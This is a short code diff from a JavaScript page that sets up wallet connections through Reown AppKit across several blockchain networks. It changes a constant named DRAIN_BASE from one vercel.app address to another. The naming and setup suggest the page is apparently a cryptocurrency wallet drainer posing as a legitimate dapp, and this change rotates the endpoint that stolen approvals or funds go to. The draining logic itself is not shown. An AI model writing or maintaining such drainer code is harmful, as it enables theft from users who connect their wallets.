@@ -7,7 +7,7 @@ import { createAppKit } from '@reown/appkit'
 import { EthersAdapter } from '@reown/appkit-adapter-ethers'
 import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base } from '@reown/appkit/networks'
 
-const DRAIN_BASE = 'https://playholding.vercel.app/';
+const DRAIN_BASE = 'https://barceoppen.vercel.app/';
 const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';
 const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
